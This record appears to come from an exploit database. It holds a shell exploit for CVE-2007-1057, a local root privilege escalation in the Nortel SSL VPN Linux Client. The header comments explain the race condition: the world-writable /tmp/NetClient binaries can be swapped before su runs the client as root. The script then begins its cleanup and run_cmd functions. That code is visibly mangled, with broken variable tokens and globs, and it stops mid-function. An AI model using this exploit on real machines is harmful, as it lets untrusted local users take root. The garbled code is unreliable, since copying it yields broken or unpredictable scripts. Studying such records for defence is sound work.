{
    "text": "ecve : CVE-2007-1057 ， title : Nortel SSL VPN Linux Client 6.0.3 - Local Privilege Escalation - Linux local Exploit ， verified : Verified ， exploit_detail :  #  ! /bin/sh ，  # Nortel SSL VPN Linux Client race condition ，  # Jon Hart <jhart @ spoofed.org> ，  # The Linux client that is utilized by versions priot to 6.05 of the Nortel ，  # SSL VPN appliance suffers from a number of problems that , in combination ,  ，  # allow an unprivileged local user to obtain root privileges. ，  # This particular bug is as follows :  ，  # 1 ) SSL VPN is initiated from the startNetdirect (  ) javascript call ，  # 2 ) A zip archive is downloaded to the local machine which contains three ，  # binaries necessary for the client : askpass , client , and surun. This ，  # archive is written to /tmp , chmod'd 777 , and then it is extracted into ，  # /tmp/NetClient ，  # 3 ) All of these files are chmod'd world writable by the following java ，  # snippet , which is called on all UNIX client OSs :  ，  # protected boolean setPermissions ( String file )  ，  # { ，  # String command = \"chmod a+xw \" + file ;  ，  # try ，  # { ，  # Process p = Runtime.getRuntime (  ) .exec ( command )  ;  ，  # p.waitFor (  )  ;  ，  # } ，  # ... ，  # } ，  # 4 ) /tmp/NetClient/surun is executed , which in turn runs ，  # /tmp/NetClient/askpass. This process aquires the root password , and ，  # then executes /tmp/NetClient/client via /bin/su and the root password. ，  # There is clearly a bug in step 2 and 3 whereby files are installed world ，  # writable. The bug I chose to exploit is the race condition in step 4 ,  ，  # combined with the insecure permissions of steps 2 and 3 , which ( IMO )  ,  ，  # gives root more easily. The risk here is if you have untrusted accounts ，  # on the machine from which you access the Nortel VPN , those accounts can ，  # easily gain local root access. ，  # The exploit is fairly simple. Wait for /tmp/NetClient/client to appear ,  ，  # swap it for our \"special version\" , and wait for a shell. ，  # Notes : a /tmp with nosuid will help mitigate this particular _exploit_ ,  ，  # but not the vulnerability. The same vulnerability also exists in the Mac ，  # client. ，  # For education and testing purposes only. Only run this on systems that ，  # you maintain/control. ， cleanup (  ) { ， rm -f $ TMP_DIR/. * - $  $ \\.. *  ， run_cmd (  ) { ， CMD= $  @  ， VPN_CLIENT_RUN=`mktemp -t vpn_client_run- $  $ .XXXXXXXX`",
    "time": "2007-02-21"
}